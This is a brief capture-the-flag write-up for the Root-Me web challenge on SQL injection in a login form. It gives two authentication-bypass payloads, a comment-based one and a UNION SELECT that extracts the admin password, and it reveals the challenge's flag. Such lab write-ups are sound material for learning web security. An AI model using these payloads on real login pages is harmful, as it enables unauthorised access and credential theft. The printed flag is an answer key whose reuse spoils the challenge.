---
title: SQL injection - Authentication
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, SQL injection]
---

* Points: 30
* Link: [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)

## Statement

> Retrieve the administrator password

## Solution

```
username: admin' --
password: <any dump things here>
```

Then it will show admin's information, but password is in bullet. View source code to get it.

The flag is
```
t0_W34k!$
```

Another way is
```
username: admin
password: ' union select password, username from users where username = 'admin
```

**Note**: ```username``` is ```admin```. ```administrator``` will not work!